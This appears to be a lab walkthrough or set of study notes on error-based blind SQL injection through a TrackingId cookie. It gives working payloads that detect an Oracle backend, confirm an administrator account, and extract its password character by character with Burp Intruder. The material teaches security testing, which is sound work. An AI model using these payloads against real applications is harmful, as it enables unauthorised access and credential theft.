# Error-based SQL injection

**Exploiting blind SQL injection by triggering conditional errors**

To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

Using this technique, you can retrieve data by testing one character at a time:

```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

**You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:**

```
TrackingId=xyz'||(SELECT '')||'
```

In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:

```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.

Depending the type of database we are dealing with, we need to use deferent query to check for valid table in the database:

- Non oracle

```
TrackingID=xyz' AND (SELECT 'a' FROM your_table LIMIT 1)='a
```

- Oracle

```
TrackingID=xyz' AND (SELECT 'a' FROM your_table WHERE ROWNUM=1)='a
```

**You can also exploit this behavior to test conditions. First, submit the following query:**

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Verify that an error message is received.

Now change it to:

```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true.

**You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:**

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:**

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Send a series of follow-up values to test different password lengths.

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

and so on...

**After determining the length of the password, the next step is to test the character at each position to determine its value using Burp Intruder**

Go to Burp Intruder and change the value of the cookie to:

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Place payload position markers around the final **a** character in the cookie value

Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally.

Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value.
